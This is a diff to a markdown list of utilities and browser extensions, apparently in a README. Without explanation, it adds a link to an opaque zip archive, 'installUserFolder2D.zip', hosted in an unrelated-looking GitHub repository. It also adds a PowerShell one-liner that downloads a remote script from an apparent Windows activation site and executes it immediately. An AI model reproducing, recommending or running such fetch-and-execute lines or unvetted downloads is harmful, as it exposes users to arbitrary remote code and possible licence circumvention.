@@ -14,8 +14,9 @@
 | QR Code Generator  | Saladict | Dual Subtitles | Split Tab |
 | Image Cropper  | User-Agent Switcher | Print Friendly |  |
 | * | * | * | * |
-| kitshub | [7zip](https://github.com/ip7z/7zip/releases/download/26.00/7z2600-x64.exe) | --- | --- |
+| kitshub | [7zip](https://github.com/ip7z/7zip/releases/download/26.00/7z2600-x64.exe) | [installUserFolder2D](https://github.com/georgeorwell8684/8684ofgate/blob/f46e8a4c16c1ebce1c7c95f38ca7a8b9dd991a6a/installUserFolder2D.zip) | --- |
 | * | * | * | * |
 | O | --- | --- | --- |
 
-W series：
+installUserFolder2D
+WO Powershell：irm https://get.activated.win | iex
